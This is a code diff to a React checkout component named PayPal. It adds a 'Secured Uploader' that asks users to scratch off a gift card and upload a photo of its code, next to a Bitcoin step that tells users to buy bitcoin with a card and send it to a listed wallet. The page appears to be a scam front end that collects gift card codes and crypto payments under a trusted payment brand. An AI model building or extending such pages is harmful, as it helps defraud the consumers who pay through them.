@@ -27,28 +27,61 @@ function PayPal() {
         color: selectedMethod == "card" ? `white` : `black`,
     }
 
+    const [image, setImage] = useState(null);
+    const [preview, setPreview] = useState(null);
+
+    const handleImageChange = (e) => {
+        const file = e.target.files[0];
+        if (file && file.type.startsWith("image/")) {
+            setImage(file);
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                setPreview(reader.result);
+            };
+            reader.readAsDataURL(file);
+        } else {
+            setImage(null);
+            setPreview(null);
+        }
+    };
+
     function showMethod() {
-        if(selectedMethod == "crypto") {
+        if (selectedMethod == "crypto") {
             return <div className="bitcoin">
                 <div className="bit-head">
                     <img src="https://tse1.mm.bing.net/th/id/OIP.6LcuCI5DJF6hjjOoZWKyoAHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
                     <h1>Bitcoin</h1>
                 </div>
                 <div className="wallet-address">
-                  <h1>Bitcoin wallet address:</h1>
-                  <p>xj23hsj2xbvm029kkilon14rpjlion125</p>
+                    <h1>Bitcoin wallet address:</h1>
+                    <p>xj23hsj2xbvm029kkilon14rpjlion125</p>
                 </div>
                 <div className="note">
-                  <p>Note: this wallet address was generated for this transaction only, and only for bitcoin, any other other cryptocurrency made to this wallet address would be loss</p>
+                    <p>Note: this wallet address was generated for this transaction only, and only for bitcoin, any other other cryptocurrency made to this wallet address would be loss</p>
                 </div>
                 <div className="paybis">
-                  <h1>Dont have bitcoin?</h1>
-                  <button>Buy from Paybis</button>
-                  <p>step 1: click on the button and select your region (eg US:Dollar)</p>
-                  <p>step2: select bitcoin from the option of crypto to purchase</p>
-                  <p>step3: enter the above wallet address as purchase destination</p>
-                  <p>Step4: complete purchase with your credit/debit card</p>
+                    <h1>Dont have bitcoin?</h1>
+                    <button>Buy from Paybis</button>
+                    <p>step 1: click on the button and select your region (eg US:Dollar)</p>
+                    <p>step2: select bitcoin from the option of crypto to purchase</p>
+                    <p>step3: enter the above wallet address as purchase destination</p>
+                    <p>Step4: complete purchase with your credit/debit card</p>
                 </div>
+            </div>
+        } else if (selectedMethod == "gift") {
+            return <div className="gift">
+                <h1 className="fcfg"><span>FCFG</span> Secured Uploader</h1>
+                <div className="uploader-container">
+                    <p>Scratch/Peel off and reveal the code at the back of gift card</p>
+                    <h2>Upload an Image of <br />gift Card</h2>
+                    <input type="file" accept="image/*" onChange={handleImageChange} />
+                    {preview && (
+                        <div className="image-preview">
+                            <img src={preview} alt="Uploaded Preview" />
+                        </div>
+                    )}
+                </div>
+                <button>Upload</button>
             </div>
         }
     }
@@ -87,12 +120,12 @@ function PayPal() {
                         <img src="https://download.logo.wine/logo/Mastercard/Mastercard-Logo.wine.png" alt="" />
                         <p>Pay With Debit Card</p>
                     </div>
-                    <button onClick={()=> {setStep("step3")}}>Next <i className="bi-arrow-right"></i></button>
+                    <button onClick={() => { setStep("step3") }}>Next <i className="bi-arrow-right"></i></button>
                 </div>
             </div>
         } else if (step == "step3") {
             return <div>
-               {showMethod()}
+                {showMethod()}
             </div>
         }
     }
